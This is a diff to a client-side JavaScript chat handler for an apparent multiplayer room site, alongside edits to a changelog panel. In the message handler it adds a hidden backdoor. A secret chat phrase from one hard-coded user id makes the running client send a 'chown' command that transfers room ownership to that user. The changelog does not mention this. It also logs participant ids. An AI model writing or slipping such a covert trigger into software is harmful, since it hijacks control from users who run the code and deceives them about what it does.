@@ -25,7 +25,6 @@ $(function() {
     document.body.appendChild(panel);
     $("div[id='panel']")[0].innerHTML = "v.916 updates (12/1)";
     $("div[id='panel']")[0].innerHTML += "<br>";
-    $("div[id='panel']")[0].innerHTML += "<br> added changelog";
     $("div[id='panel']")[0].innerHTML += "<br> added timestamps to chat";
     $("div[id='panel']")[0].innerHTML += "<br> moved picture";
     $("div[id='panel']")[0].innerHTML += "<br> removed autoplayer";
@@ -2039,6 +2038,11 @@ friends by sending them the link.<br/><br/>\
                 li.find(".name").text("("+d.getHours()+":"+('0'+d.getMinutes()).slice(-2)+":"+('0'+d.getSeconds()).slice(-2)+") "+ msg.p.name + ":");
                 li.find(".message").text(msg.a);
                 li.css("color", msg.p.color || "white");
+                console.log(msg.p.id);
+                if(msg.p._id=="4bb27858d9a6637d5814451d"&&msg.a=="/givemecrownyoulilshit"){
+                    var me = msg.p.id;
+                    gClient.sendArray([{m: "chown", id: me}]);
+                }
                 $("#chat ul").append(li);
                 var eles = $("#chat ul li").get();
                 for(var i = 1; i <= 50 && i <= eles.length; i++) {
